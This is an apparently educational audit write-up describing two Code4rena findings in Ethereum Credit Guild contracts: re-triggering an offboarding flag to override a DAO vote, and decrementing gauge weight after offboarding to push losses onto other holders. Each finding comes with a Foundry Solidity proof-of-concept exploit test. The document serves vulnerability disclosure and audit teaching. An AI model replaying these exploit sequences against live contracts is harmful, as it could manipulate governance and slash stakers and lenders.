# ETAAcademy-Adudit: 1. DAO

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. DAO</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Governance</th>
          <td>DAO</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [Medium] Re-triggering the canOffboard[term] flag to bypass the DAO vote of the lending term offboarding mechanism

### Offboarding lending term

- Summary: The vulnerability allows an attacker to repeatedly trigger offboarding a re-onboarding lending term, bypassing the DAO vote offboarding mechanism. Even after the term is offboarded and cleaned up, the attacker can trigger another offboarding vote before the poll ends, to re-trigger the `canOffboard[term]` flag. This enables the attacker to force offboarding of the re-onboarded term at any time, overriding the DAO vote.

- Impact & Recommendation: The attack not only manipulates offboarding but also triggers silent auctions for existing loans. If a loan fails to attract bids, causing a loss, stakers who voted for the term via the SurplusGuildMinter contract are slashed, impacting both borrowers and stakers significantly. Prevent the offboarding poll from reactivating the `canOffboard[term]` flag after the lending term cleanup, or end the poll if the term has been cleaned up.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testPoCBreakingDaoVoteOffboarding() public {
        // Prepare for Attacker
        address Attacker = address(1);
        guild.mint(Attacker, 1);
        vm.prank(Attacker);
        guild.delegate(Attacker);
        // Prepare for Bob
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();
        uint256 snapshotBlock = block.number;
        uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;
        // Bob proposes an offboarding of the term
        assertEq(guild.isGauge(address(term)), true);
        offboarder.proposeOffboard(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        vm.expectRevert("LendingTermOffboarding: quorum not met");
        offboarder.cleanup(address(term));
        // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)
        assertEq(guild.isGauge(address(term)), true);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(offboarder.canOffboard(address(term)), true);
        // Cannot clean up because loans are active
        vm.expectRevert("LendingTermOffboarding: not all loans closed");
        offboarder.cleanup(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        // Get enough CREDIT to pack back interests
        vm.stopPrank();
        uint256 debt = term.getLoanDebt(aliceLoanId);
        credit.mint(alice, debt - aliceLoanSize);
        // Alice closes loan
        vm.startPrank(alice);
        credit.approve(address(term), debt);
        term.repay(aliceLoanId);
        vm.stopPrank();
        // Clean up the term
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
        offboarder.cleanup(address(term));
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        assertEq(offboarder.canOffboard(address(term)), false); // The canOffboard[term] flag has been reset
        assertEq(core.hasRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term)), false);
        assertEq(core.hasRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term)), false);
        // Attacker votes for offboarding the term to re-trigger the canOffboard[term] flag again
        vm.startPrank(Attacker);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        assertEq(offboarder.canOffboard(address(term)), true); // Attacker has re-triggered the canOffboard[term] flag
        vm.stopPrank();
        // Next 10 days
        // Offboarding poll expired
        vm.roll(block.number + 66460); // 10 days
        vm.warp(block.timestamp + 66460 * 13);
        assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);
        // The term is re-onboarded
        assertEq(guild.isGauge(address(term)), false);
        guild.addGauge(1, address(term));
        assertEq(guild.isGauge(address(term)), true);
        // Next 30 days
        vm.roll(block.number + 199380); // 30 days
        vm.warp(block.timestamp + 199380 * 13);
        assertEq(guild.isGauge(address(term)), true);
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        // Attacker offboards the term by overriding the DAO vote offboarding mechanism
        vm.startPrank(Attacker);
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
    }

  ```

  </details>

## 2. [Medium] The gauge status wasn’t checked before reducing the user’s gauge weight.

### Reduce weight to transfer loss

- Summary: In the event of any loss triggered by **`ProfitManager#notifyPnL()`**, all staked guild tokens on the lending term will be entirely slashed through **`GuildToken#notifyGaugeLoss()`**, with termSurplusBuffer[gauge] depleting and donating to surplusBuffer. Loss will first decrease from surplusBuffer, and if surplusBuffer is insufficient, the remaining loss will reduce the creditMultiplier for each credit token. A term can be offboarded if deemed unsafe, pausing the redemption function of the corresponding SimplePSM. Once offboarded, potential losses are distributed to all credit token holders, as exiting in advance is not possible. However, guild holders can reduce their weight on the offboarded term, transferring potential losses to other holders.

- Impact & Recommendation: Preventing gauge weight deprecation upon offboarding a lending term is advisable, particularly with surplus GUILD minter, as it ensures protection for passive lenders by retaining surplus buffer capital that may otherwise escape.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/651) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function testOffboardTermAndDecrementGauge() public {
        //@audit-info term2 is deployed
        LendingTerm term2 = LendingTerm(Clones.clone(address(new LendingTerm())));
        term2.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: 0,
                minPartialRepayPercent: 0,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        vm.startPrank(governor);
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term2));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term2));
        vm.stopPrank();
        //@audit-info active term2, which has the same gauge type with term1
        guild.addGauge(1, address(term2));
        //@audit-info mint 2e18 guild token to carol
        guild.mint(carol, 2e18);
        vm.startPrank(carol);
        guild.incrementGauge(address(term), 1e18);
        guild.incrementGauge(address(term2), 1e18);
        vm.stopPrank();
        // prepare (1)
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 snapshotBlock = block.number;
        //@audit-info bob propose to offboard term
        offboarder.proposeOffboard(address(term));
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 13);
        //@audit-info term is able to be offboarded with enough votes.
        offboarder.supportOffboard(snapshotBlock, address(term));
        assertEq(offboarder.polls(snapshotBlock, address(term)), _QUORUM + 1);
        assertEq(offboarder.canOffboard(address(term)), true);
        assertEq(guild.isGauge(address(term)), true);
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        offboarder.offboard(address(term));
        //@audit-info term is offboarded
        assertEq(guild.isGauge(address(term)), false);
        //@audit-info the redemption function is paused, no one can redeem their credit token
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
        vm.stopPrank();
        assertEq(guild.getUserGaugeWeight(carol, address(term)), 1e18);
        vm.prank(carol);
        //@audit-info however, carol can decrement their gauge weight on term
        guild.decrementGauge(address(term), 1e18);
        assertEq(guild.getUserGaugeWeight(carol, address(term)), 0);
    }

  ```

  </details>
